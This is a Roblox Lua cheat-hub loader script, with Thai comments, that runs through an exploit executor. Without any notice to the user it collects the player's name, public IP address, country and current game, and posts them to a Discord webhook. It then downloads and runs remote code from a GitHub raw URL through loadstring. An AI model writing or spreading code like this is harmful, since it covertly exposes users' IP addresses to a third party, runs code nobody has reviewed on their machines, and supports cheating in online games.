if getgenv().TURKHUB_LOADED then return end
getgenv().TURKHUB_LOADED = true

if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
local request = syn and syn.request or http_request or request

local LoaderURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/Run/Loader.lua"
local Webhook = "https://discord.com/api/webhooks/1479493583118794904/..."

-- ⚡ โหลดข้อมูลแบบขนาน
local ip,country,gameName="...","...","..."

task.spawn(function()
	pcall(function()
		ip = game:HttpGet("https://api.ipify.org")
	end)
end)

task.spawn(function()
	pcall(function()
		local data = game:HttpGet("http://ip-api.com/json")
		country = HttpService:JSONDecode(data).country
	end)
end)

task.spawn(function()
	pcall(function()
		gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
	end)
end)

-- ⚡ ยิง webhook แบบไม่รอ
task.spawn(function()
	task.wait(1) -- รอข้อมูลนิดเดียวพอ

	if request then
		local data = {
			["embeds"] = {{
				["title"] = "🚀 EXECUTED",
				["color"] = 65280,
				["fields"] = {
					{name="👤 Player",value=LocalPlayer.Name,inline=true},
					{name="🌍 Country",value=country,inline=true},
					{name="🌐 IP",value=ip,inline=false},
					{name="🎮 Game",value=gameName,inline=false}
				}
			}}
		}

		request({
			Url = Webhook,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(data)
		})
	end
end)

-- ⚡ โหลดสคริปทันที (ไม่ต้องรอ analytics)
loadstring(game:HttpGet(LoaderURL))()